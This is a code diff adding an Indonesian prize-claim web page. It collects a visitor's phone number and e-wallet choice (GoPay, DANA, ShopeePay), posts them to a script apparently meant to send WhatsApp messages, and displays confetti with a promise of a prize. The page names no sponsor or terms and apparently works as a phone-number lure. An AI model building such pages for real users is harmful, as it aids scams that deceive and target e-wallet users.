@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Ambil Hadiah</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;700&display=swap" rel="stylesheet">
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Poppins', sans-serif;
+      background: linear-gradient(135deg, #1e1e2f, #2c3e50);
+      color: white;
+      text-align: center;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+    }
+    h1 {
+      font-size: 2em;
+      margin-bottom: 20px;
+    }
+    .button {
+      padding: 15px 30px;
+      margin: 10px;
+      font-size: 1.2em;
+      border: none;
+      border-radius: 30px;
+      background: #00b894;
+      color: white;
+      cursor: pointer;
+      transition: all 0.3s ease;
+    }
+    .button:hover {
+      background: #00cec9;
+      transform: scale(1.1);
+    }
+    .notif {
+      margin-top: 20px;
+      padding: 15px;
+      border-radius: 10px;
+      background: #2ecc71;
+      display: none;
+    }
+    .options {
+      display: none;
+      margin-top: 20px;
+    }
+    .option-btn {
+      background: #0984e3;
+      padding: 12px 25px;
+      border-radius: 25px;
+      margin: 5px;
+      color: white;
+      border: none;
+      font-size: 1em;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+    .option-btn:hover {
+      background: #74b9ff;
+      transform: scale(1.1);
+    }
+    .input-container {
+      margin-top: 20px;
+      display: none;
+    }
+    input[type="text"] {
+      padding: 12px;
+      width: 80%;
+      font-size: 1em;
+      border-radius: 15px;
+      border: none;
+      margin-bottom: 15px;
+      background-color: #ffffff;
+      color: #2c3e50;
+    }
+    input[type="text"]:focus {
+      outline: none;
+      border: 2px solid #00cec9;
+    }
+  </style>
+</head>
+<body>
+  <h1 id="title">Selamat Datang!</h1>
+
+  <!-- Tombol Ambil Hadiah -->
+  <button class="button" id="ambilHadiahBtn" onclick="showInput()">Ambil Hadiah</button>
+
+  <!-- Kolom Input Nomor Telepon -->
+  <div class="input-container" id="inputContainer">
+    
+    <input type="text" id="phoneNumber" placeholder="Contoh: 08123456789" />
+    <button class="button" onclick="showOptions()">Kirim Nomor</button>
+  </div>
+
+  <!-- Opsi Hadiah -->
+  <div class="options" id="options" style="display:none;">
+   
+    <button class="option-btn" onclick="kirimHadiah('gopay')">GoPay</button>
+    <button class="option-btn" onclick="kirimHadiah('dana')">DANA</button>
+    <button class="option-btn" onclick="kirimHadiah('shopee')">ShopeePay</button>
+  </div>
+
+  <!-- Notifikasi -->
+  <div class="notif" id="notif">Hadiah akan dikirim dalam 5-10 menit</div>
+
+  <canvas id="confetti" style="position:fixed; top:0; left:0; width:100%; height:100%; pointer-events:none;"></canvas>
+
+  <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
+  <script>
+    let hadiahSudahDipilih = false;
+
+    // Fungsi untuk menampilkan input nomor telepon
+    function showInput() {
+      document.getElementById('inputContainer').style.display = 'block';
+      document.getElementById('ambilHadiahBtn').style.display = 'none';
+      document.getElementById('title').textContent = 'Masukkan Nomor Telepon';
+    }
+
+    // Fungsi untuk menampilkan opsi hadiah setelah nomor telepon dimasukkan
+    function showOptions() {
+      const phoneNumber = document.getElementById('phoneNumber').value.trim();
+
+      // Validasi nomor telepon
+      if (phoneNumber.length < 10 || phoneNumber.length > 15) {
+        alert('Nomor telepon tidak valid!');
+        return;
+      }
+
+      // Menyembunyikan kolom input dan menampilkan opsi hadiah
+      document.getElementById('inputContainer').style.display = 'none';
+      document.getElementById('options').style.display = 'block';
+      document.getElementById('title').textContent = 'Pilih metode hadiah';
+    }
+
+    // Fungsi untuk mengirim hadiah
+    function kirimHadiah(tipe) {
+      if (hadiahSudahDipilih) return;  // Cegah pengiriman berulang
+
+      let phoneNumber = document.getElementById('phoneNumber').value.trim();
+
+      // Pastikan nomor dimulai dengan kode negara (untuk Indonesia, kode negara adalah 62)
+      if (phoneNumber.startsWith('0')) {
+        phoneNumber = '62' + phoneNumber.substring(1); // Mengubah nomor yang diawali dengan 0 menjadi format internasional
+      }
+
+      // Kirim data ke PHP
+      fetch('send_wa.php', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+        body: `phoneNumber=${phoneNumber}&metode=${tipe}`
+      }).then(response => {
+        return response.json(); // Misalnya jika response dalam bentuk JSON
+      }).then(() => {
+        hadiahSudahDipilih = true;
+        document.getElementById('notif').style.display = 'block';
+        confetti({
+          particleCount: 150,
+          spread: 100,
+          origin: { y: 0.6 }
+        });
+
+        // Sembunyikan tombol dan opsi
+        document.getElementById('options').style.display = 'none';
+        document.getElementById('inputContainer').style.display = 'none';
+        document.getElementById('title').textContent = 'Hadiah Diterima';
+        document.getElementById('notif').textContent = 'Mohon tunggu selama 5-10 menit.';
+      }).catch(error => {
+        console.error('Terjadi kesalahan:', error);
+        alert('Terjadi kesalahan dalam pengiriman pesan.');
+      });
+    }
+  </script>
+</body>
+</html>
